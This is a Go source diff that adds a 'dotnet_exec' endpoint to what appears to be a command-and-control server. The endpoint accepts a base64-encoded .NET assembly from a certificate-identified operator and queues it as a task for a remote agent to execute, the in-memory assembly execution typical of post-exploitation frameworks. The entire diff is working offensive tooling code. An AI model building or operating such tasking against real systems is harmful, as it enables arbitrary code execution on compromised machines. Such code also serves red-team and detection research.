@@ -310,6 +310,51 @@ func (s *Server) apiAgentDetail(w http.ResponseWriter, r *http.Request) {
 			operator, agentID[:8], tid, req.Assembly)
 		jsonOK(w, map[string]int64{"task_id": tid})
 
+	case "dotnet_exec":
+		// POST /api/agents/{id}/dotnet_exec
+		// Body: {"assembly":"<base64_bytes>","args":"arg1 arg2","type":"<opt>","method":"<opt>"}
+		if r.Method != http.MethodPost {
+			jsonErr(w, "POST required", http.StatusMethodNotAllowed)
+			return
+		}
+		var req struct {
+			Assembly string `json:"assembly"` // base64-encoded .NET PE bytes
+			Args     string `json:"args"`     // argument string for entry method
+			Type     string `json:"type"`     // optional: entry type name
+			Method   string `json:"method"`   // optional: entry method name
+		}
+		if err := jsonBody(r, &req); err != nil {
+			jsonErr(w, err.Error(), http.StatusBadRequest)
+			return
+		}
+		if req.Assembly == "" {
+			jsonErr(w, "assembly (base64) required", http.StatusBadRequest)
+			return
+		}
+		// Validate the base64 is decodable
+		asmBytes, err := base64.StdEncoding.DecodeString(req.Assembly)
+		if err != nil {
+			jsonErr(w, "assembly: invalid base64: "+err.Error(), http.StatusBadRequest)
+			return
+		}
+		// Re-encode to canonical base64 for the task args JSON
+		asmB64 := base64.StdEncoding.EncodeToString(asmBytes)
+		taskArgsJSON, _ := json.Marshal(map[string]string{
+			"asm":    asmB64,
+			"args":   req.Args,
+			"type":   req.Type,
+			"method": req.Method,
+		})
+		operator := operatorFromCert(r)
+		tid, err := s.db.QueueTask(agentID, "DOTNET_EXEC", string(taskArgsJSON), nil, operator)
+		if err != nil {
+			jsonErr(w, err.Error(), http.StatusInternalServerError)
+			return
+		}
+		s.printf("[%s→%s] task #%d queued: DOTNET_EXEC (%d bytes)\n",
+			operator, agentID[:8], tid, len(asmBytes))
+		jsonOK(w, map[string]int64{"task_id": tid})
+
 	case "note":
 		if r.Method != http.MethodPost {
 			jsonErr(w, "POST required", http.StatusMethodNotAllowed)
